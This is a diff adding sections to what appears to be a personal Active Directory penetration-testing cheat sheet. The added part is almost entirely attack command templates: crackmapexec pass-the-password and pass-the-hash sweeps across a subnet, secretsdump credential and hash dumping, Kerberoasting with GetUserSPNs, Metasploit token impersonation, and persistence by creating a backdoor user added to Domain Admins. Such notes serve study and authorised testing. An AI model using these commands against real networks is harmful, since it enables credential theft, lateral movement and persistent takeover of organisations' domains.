@@ -45,3 +45,37 @@ sudo mitm6 -d <domain name>
 ```
 On successful it will create a lootme folder in the local machine with a bunch of information.
 
+# Pass Attacks
+- Using **Crackmapexec smb**
+```bash
+crackmapexec smb xxx.xxx.xxx.0/24 -u <uname> -d <domain> -p <password>
+
+crackmapexec smb xxx.xxx.xxx.0/24 -u <uname> -d <domain> -H <hash> --local-auth
+```
+# Dumping and Cracking hashes
+- using **secretsdump**
+```bash
+secretsdump.py <domain>/<user>:<password>@<target IP>
+
+secretsdump.py <user>:@<IP> -hashes <hash>
+```
+# Kerberosting
+- Using **GetUserSPNs**
+```bash
+sudo GetUserSPNs.py <domain>/<user>:<password> -dc-ip <IP> -request
+```
+# Token Impersonation
+- Using **Metasploit**
+```bash
+meterpreter> load incognito
+meterpreter> list tokens -u
+meterpreter> impersonate_token <token name>
+```
+- Next for persistence, we can add new user and run secretsdump.
+```bash
+meterpreter> net user /add badboy password123 /DOMAIN
+meterpreter> net group "Domain Admins" badboy /ADD /DOMAIN
+
+
+secretsdump.py <Domain>/badboy:'password123'@<IP>
+```
